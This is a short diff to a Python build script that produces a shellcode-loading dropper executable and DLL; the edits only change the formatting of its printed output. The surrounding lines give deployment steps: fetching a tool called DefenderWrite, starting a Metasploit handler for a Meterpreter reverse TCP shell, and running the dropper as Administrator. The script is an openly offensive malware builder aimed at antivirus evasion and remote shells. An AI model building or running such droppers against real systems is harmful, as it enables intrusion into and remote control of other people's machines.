@@ -248,12 +248,14 @@ int main() {{
         if os.path.exists(temp_file):
             os.remove(temp_file)
 
-    print(f"\\n[+] BUILD SUCCESSFUL!\\n")
+
+
+    print(f"\n[+] BUILD SUCCESSFUL!")
     print(f"[+] Files created:")
     print(f"    - {exe_name} (Dropper)")
     print(f"    - {dll_name} (Shellcode DLL - {len(shellcode_bytes)} bytes)")
-    print(f"\\n[!] IMPORTANT: Download DefenderWrite.exe from GitHub\\n")
-    print(f"\\n[+] DEPLOYMENT STEPS:\\n")
+    print(f"\n[!] IMPORTANT: Download DefenderWrite.exe from GitHub")
+    print(f"\n[+] DEPLOYMENT STEPS:")
     print(f"    1. Download DefenderWrite.exe from: https://github.com/TwoSevenOneT/DefenderWrite")
     print(f"    2. On Windows VM, place these 3 files in SAME directory:")
     print(f"       - {exe_name}")
@@ -261,7 +263,7 @@ int main() {{
     print(f"       - DefenderWrite.exe")
     print(f"    3. Start listener: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST {args.LHOST}; set LPORT {args.LPORT}; exploit'")
     print(f"    4. Run {exe_name} as Administrator on Windows VM")
-    print(f"\\n[+] Debugging tips:\\n")
+    print(f"\n[+] Debugging tips:")
     print(f"    - Check Windows Event Viewer for errors")
     print(f"    - Verify all 3 files are in the same directory")
     print(f"    - Run as Administrator")
